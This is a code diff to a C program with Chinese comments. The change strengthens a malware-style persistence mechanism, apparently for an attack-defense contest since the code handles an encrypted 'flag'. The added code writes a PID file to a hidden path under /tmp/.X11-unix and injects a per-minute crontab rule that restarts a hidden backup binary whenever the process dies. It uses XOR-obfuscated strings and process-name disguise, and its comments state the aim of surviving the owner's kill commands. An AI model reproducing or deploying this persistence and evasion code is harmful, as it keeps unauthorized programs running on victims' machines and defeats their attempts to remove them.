@@ -11,6 +11,7 @@ extern char **environ;
 #define REEXEC_MAGIC "__XSH_REEXEC__"
 #define GHOST_MAGIC  "__XSH_GHOST__"  /* 幽灵复活器标记 */
 #define GHOST_PATH   "/tmp/.X11-unix/.xs"  /* 二进制备份隐藏路径 */
+#define PID_FILE     "/tmp/.X11-unix/.xpid" /* PID 文件，用于 crontab 判活 */
 
 char flag[RSA_BYTES + 16] = "";  /* RSA 加密后 128 字节 */
 int flag_len = 0;
@@ -118,11 +119,30 @@ static void backup_self()
 }
 
 /*
+ * write_pid_file：写入当前主进程 PID 到 PID_FILE。
+ * crontab 规则通过读取此文件并 kill -0 检查进程是否存活。
+ * 比 pgrep -f 更可靠：不受 ChangeProcessName 伪装影响。
+ */
+static void write_pid_file()
+{
+    char buf[32];
+    int n = snprintf(buf, sizeof(buf), "%d", getpid());
+    int fd = open(XorString(PID_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0)
+    {
+        write(fd, buf, n);
+        close(fd);
+    }
+}
+
+/*
  * install_cron_resurrect：向当前用户的 crontab 注入一条每分钟复活的规则。
  *
  * 原理：
  *   crontab 由系统 crond（root）驱动执行，pkill -u test 杀不掉 crond。
- *   每分钟检查 GHOST_PATH 是否存在且没有对应进程在运行，若没有则启动。
+ *   每分钟通过 PID 文件检查主进程是否存活：
+ *     读取 PID_FILE → kill -0 $pid → 失败则重启。
+ *   比 pgrep -f 可靠：不受 ChangeProcessName 进程名伪装影响。
  *   用唯一标记注释（#XSH_CRON）防止重复添加。
  */
 static void install_cron_resurrect()
@@ -175,15 +195,25 @@ static void install_cron_resurrect()
         return; /* 已安装，不重复添加 */
 
     /* 构建 crontab 命令：用 fork+exec 替代 system()，不触碰 SIGCHLD */
+    /*
+     * 规则逻辑：
+     *   [ -x GHOST_PATH ] && ! kill -0 $(cat PID_FILE) 2>/dev/null && GHOST_PATH GHOST_MAGIC
+     *
+     * 解读：
+     *   1. 备份二进制存在且可执行
+     *   2. PID 文件中记录的进程不存活（kill -0 失败）
+     *   3. 以 ghost 模式重启
+     */
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
-        "%s%s%s%s%s%s %s %s%s",
+        "%s%s%s%s%s%s%s %s %s%s",
         XorString("(crontab -l 2>/dev/null; echo '* * * * * [ -x "),
         XorString(GHOST_PATH),
-        XorString(" ] && ! pgrep -f "),
+        XorString(" ] && ! kill -0 $(cat "),
+        XorString(PID_FILE),
+        XorString(") 2>/dev/null && "),
         XorString(GHOST_PATH),
-        XorString(" >/dev/null && "),
-        XorString(GHOST_PATH),
+        XorString(""),
         XorString(GHOST_MAGIC),
         XorString(" #XSH_CRON"),
         XorString("') | crontab -"));
@@ -1240,6 +1270,7 @@ int main(int argc, char *argv[])
 
     init_deamon();
     signal(SIGCHLD, SIG_IGN);   /* 尽早设置，防止后续 fork 产生僵尸 */
+    write_pid_file();           /* 写 PID 文件，供 crontab 判活 */
 
     srand(getpid() ^ time(NULL));
 
